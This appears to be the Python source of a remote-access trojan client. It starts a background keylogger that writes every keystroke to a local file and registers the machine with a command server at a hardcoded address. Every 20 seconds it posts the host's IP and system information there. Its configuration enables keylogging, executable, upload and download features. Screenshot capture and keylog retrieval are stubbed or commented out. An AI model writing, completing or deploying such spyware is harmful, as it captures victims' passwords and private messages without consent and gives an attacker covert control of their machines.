DATA = {'keylog': 'yes', 'screenshot': 'no', 'exe': 'yes', 'upload': 'yes', 'download': 'yes', 'notification': 'no', 'link': '192.168.1.10', 'freq': '20'}
import os
import requests
import socket
from io import BytesIO
import base64
import pyautogui
import _thread
import time
import platform
from pynput.keyboard import Listener

class Client:
    def __init__(self):
        DATA['link'] = 'http://' + DATA['link'] + ':3000'
        data = {
            'ip': socket.gethostbyname(socket.gethostname()),
            'sysinfo': platform.uname(),
            'keylog': 'None',
            'screenshot': 'None',
            'status': 'online'
        }
        self.url = DATA['link'].lstrip('/') + '/api/checkConn'
        response = requests.post(self.url, data)
        print(response.text)
        # self.checkStartup()
        _thread.start_new_thread( self.startKeylogging, () )
        self.run()

    
    def startKeylogging(self):
        def log_keystroke(key):
            key = str(key).replace("'", "")

            if key == 'Key.space':
                key = ' '
            if key == 'Key.shift_r':
                key = ''
            if key == "Key.enter":
                key = '\n'

            with open("log.txt", 'a') as f:
                f.write(key)

        with Listener(on_press=log_keystroke) as l:
            l.join()


    # def takeScreenshot(self, name):
    #     # Must return <string> with image hash
    #     myScreenshot = pyautogui.screenshot()
    #     return base64.b64encode(myScreenshot)

    #     buffered = BytesIO()
    #     myScreenshot.save(buffered, format="JPEG")

    #     img_str = base64.b64encode(buffered.getvalue())) + '\Microsoft\Windows\TEMP\{}'.format(name))


    def getKeylog(self):
        # Must return <string> with all logs
        # stringLog = ''
        # with open('log.txt', 'r') as log:
        #     stringLog = log.read()

        # return stringLog
        pass


    def run(self):
        while True:
            print('threading worked')
            data = {
                'ip': socket.gethostbyname(socket.gethostname()),
                'sysinfo': platform.uname(),
                'keylog': self.getKeylog(),
                'screenshots': 'nothing yet',
                'status': 'online'
            }
            requests.post(self.url, data)
            time.sleep(int(DATA['freq']))


    def handleCommands(self):
        pass


client = Client()

input()